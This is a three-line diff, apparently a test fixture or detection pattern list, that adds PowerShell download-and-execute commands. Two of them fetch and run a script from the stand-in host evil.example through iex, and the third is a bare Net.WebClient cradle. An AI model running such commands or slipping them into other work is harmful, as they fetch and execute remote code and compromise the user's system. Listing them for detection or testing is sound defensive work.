@@ -1,0 +1,3 @@
+iex (iwr https://evil.example/x.ps1)
+Invoke-WebRequest https://evil.example/x.ps1 | iex
+IEX(New-Object Net.WebClient)
